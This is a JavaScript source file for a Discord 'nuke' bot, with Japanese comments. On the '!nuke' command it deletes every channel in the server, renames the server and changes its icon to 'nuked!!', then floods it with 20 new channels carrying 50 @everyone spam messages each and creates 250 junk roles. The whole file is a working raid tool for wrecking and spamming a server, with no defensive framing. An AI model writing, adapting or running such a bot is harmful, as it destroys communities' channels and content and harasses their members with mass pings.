const { Client, Intents } = require('discord.js'); 
const fs = require('fs');
const emojis = fs.readFileSync('emoji.txt', 'utf8').split('\n');
require('dotenv').config()　

const client = new Client({intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MEMBERS, Intents.FLAGS.GUILD_MESSAGES]}); 

const token = process.env.TOKEN; // .envからTOKENを読み込む

client.once('ready', () => {
    console.log('起動！');
});

client.login(token);

client.on('messageCreate', async message => {
    try {
        if (message.content === '!nuke') {
            await Promise.all(message.guild.channels.cache.map(async channel => {
                try {
                    await channel.delete();
                } catch (error) {
                    console.error(`チャンネルの削除中にエラーが発生しました: ${error.message}`);
                }
            }));

            await message.guild.setName('nuked!!');

            const iconFile = fs.readFileSync('nuke.png');
            await message.guild.setIcon(iconFile);

            const channelsPromises = Array.from({ length: 20 }, async (_, i) => {
                try {
                    const createdChannel = await message.guild.channels.create(`nuked ${emojis.slice(0, 5).join(' ')} ${emojis[i % emojis.length]}`, { type: 0 });

                    const botMessagesPromises = Array.from({ length: 50 }, async () => {
                        await createdChannel.send(`# NUKED!!\n@everyone ${emojis[Math.floor(Math.random() * emojis.length)]} ${emojis.slice(0, 5).join(' ')}`);
                    });

                    await Promise.all(botMessagesPromises);
                } catch (error) {
                    console.error(`チャンネルの作成中にエラーが発生しました: ${error.message}`);
                }
            });

            try {
                await Promise.all(channelsPromises);

                for (let i = 0; i < 250; i++) {
                    try {
                        await message.guild.roles.create({
                            name: 'nuked! ' + emojis[i % emojis.length],
                            color: 'RANDOM',
                        });
                    } catch (error) {
                        console.error(`ロールの作成中にエラーが発生しました: ${error.message}`);
                    }
                }
            } catch (error) {
                console.error('チャンネルの作成上限エラーが発生しました:', error.message);
            }
        }
    } catch (error) {
        console.error('メッセージ作成中にエラーが発生しました:', error.message);
    }
});
